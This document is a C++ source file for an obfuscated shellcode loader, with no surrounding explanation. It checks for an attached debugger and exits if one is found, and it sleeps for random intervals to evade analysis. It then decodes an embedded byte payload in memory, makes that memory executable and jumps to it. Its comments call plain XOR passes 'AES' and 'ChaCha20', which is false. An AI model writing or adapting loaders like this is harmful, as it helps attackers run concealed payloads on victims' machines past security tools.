#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

bool instUtilxHuHgv141() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

int main() {
    // Random performance delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delay_dist(1, 999);
        int delay_ms = delay_dist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    // Anti-debug
    if (instUtilxHuHgv141()) return 0;

    // Payload data
    unsigned char sysBaseTKsEej296[] = {
        0x95, 0x6f, 0x3a, 0xd5, 0x12, 0x67, 0x51, 0x4a, 0x39, 0x93, 0x5c, 0x05, 0x93, 0x27, 0x19, 0x06, 
        0xb9, 0x6f, 0xc6, 0x20, 0x27, 0x52, 0x70, 0x15, 0x78, 0x33, 0x1c, 0x7a, 0xb6, 0x04, 0x6b, 0x67, 
        0xb3, 0x5d, 0x51, 0x02, 0x03
    };

    // Decryption keys
    unsigned char procHelperIfNkOVYUG366[] = {
        0xcd, 0x33, 0x8f, 0x29, 0xa3, 0xf4, 0xb4, 0xf6, 0xf0, 0x0b, 0xc2, 0x53, 0x82, 0xc3, 0x35, 0x12, 
        0x00
    };
    unsigned char execServiceEXkZvfvXtPv433[] = {
        0x15, 0x5d, 0x13, 0x41, 0xd5, 0xb7, 0xbb, 0xcb, 0x8d, 0xc4, 0xd9, 0x5d, 0x6a, 0x20, 0xb3, 0xfa
    };
    unsigned char runModuleOVDitnzWm497[] = {
        0xce, 0xd9, 0xfa, 0xb6, 0x8f, 0x92, 0x6c, 0xfe, 0x3e, 0x7e, 0x2f, 0x4e, 0xd6, 0x30, 0xe2, 0x83, 
        0xc4, 0x61, 0x71, 0xfb, 0x95, 0x75, 0x31, 0x2d, 0x0a, 0xf1, 0x0c, 0x76, 0x5f, 0x37, 0x98, 0x5e
    };

    // Random delay before memory allocation
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> alloc_dist(1, 50);
        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));
    }

    // Allocate executable memory
    size_t execManageronuCVifkgua632 = sizeof(sysBaseTKsEej296);
#ifdef _WIN32
    void* instServiceapXUTAbydTK078 = VirtualAlloc(0, execManageronuCVifkgua632, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServiceapXUTAbydTK078) return 1;
#else
    void* instServiceapXUTAbydTK078 = mmap(0, execManageronuCVifkgua632, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServiceapXUTAbydTK078 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServiceapXUTAbydTK078, sysBaseTKsEej296, execManageronuCVifkgua632);
    unsigned char* valHandlerxfkwxzHyHY611 = (unsigned char*)instServiceapXUTAbydTK078;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManageronuCVifkgua632; i++) {
        valHandlerxfkwxzHyHY611[i] ^= procHelperIfNkOVYUG366[i % sizeof(procHelperIfNkOVYUG366)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManageronuCVifkgua632; i++) {
        valHandlerxfkwxzHyHY611[i] ^= runModuleOVDitnzWm497[i % sizeof(runModuleOVDitnzWm497)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManageronuCVifkgua632; i++) {
        valHandlerxfkwxzHyHY611[i] ^= execServiceEXkZvfvXtPv433[i % sizeof(execServiceEXkZvfvXtPv433)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponentSlLIXRUCoCSVh881;
    VirtualProtect(instServiceapXUTAbydTK078, execManageronuCVifkgua632, PAGE_EXECUTE_READ, &methComponentSlLIXRUCoCSVh881);
    FlushInstructionCache(GetCurrentProcess(), instServiceapXUTAbydTK078, execManageronuCVifkgua632);
#else
    mprotect(instServiceapXUTAbydTK078, execManageronuCVifkgua632, PROT_READ | PROT_EXEC);
#endif

    // Final random delay before execution
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> exec_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));
    }

    // Execute payload
    ((void(*)())instServiceapXUTAbydTK078)();

    return 0;
}
